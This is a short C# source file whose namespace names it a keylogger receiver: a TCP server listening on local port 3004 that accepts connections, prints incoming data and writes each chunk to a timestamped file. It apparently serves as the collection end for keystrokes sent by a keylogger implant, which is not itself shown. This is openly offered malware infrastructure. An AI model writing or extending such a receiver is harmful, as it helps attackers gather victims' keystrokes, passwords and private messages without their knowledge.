using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using static System.Net.Mime.MediaTypeNames;
using System.IO;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace SocketKeyLogerReciver

{
    class Program
    {
        public static void _doChat(Socket clientSocket, long address)
        {
            string FileName = Environment.CurrentDirectory + address + DateTime.Now.ToLongDateString() + DateTime.Now.ToLongTimeString().Replace("\\", "_").Replace(":", "_").Replace("\\", "_").Replace(",", "_")+Guid.NewGuid();

            byte[] buffer = new byte[1024];
            int iRx = clientSocket.Receive(buffer);
            char[] chars = new char[iRx];

            System.Text.Decoder d = System.Text.Encoding.UTF8.GetDecoder();
            int charLen = d.GetChars(buffer, 0, iRx, chars, 0);
            System.String recv = new System.String(chars);
            Console.WriteLine("Recived Data :{0}", recv);

            saveFiles(FileName, buffer);
            buffer = null;
        }

        private static void saveFiles(string FileName, byte[] clientData)
        {
            BinaryWriter bWrite = new BinaryWriter(File.Open(FileName, FileMode.Create));
            bWrite.Write(clientData, 0, clientData.Length);
            bWrite.Close();
        }  

        static void Main(string[] args)
        {
            IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
            Console.WriteLine("Starting TCP listener...");
            IPEndPoint ipEnd = new IPEndPoint(ipAddress, 3004);
            Socket serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP); ;
            serverSocket.Bind(ipEnd);
            int counter = 0;
            serverSocket.Listen(3004);
            Console.WriteLine(" >> " + "Server Started");
            while (true)
            {
                counter += 1;
                Socket clientSocket = serverSocket.Accept();
                Console.WriteLine(" >> " + "Client No:" + Convert.ToString(counter) + " started");
                new Thread(delegate ()
                {_doChat(clientSocket, ipEnd.Address.Address);
                }).Start();



            }


        }

    }

}

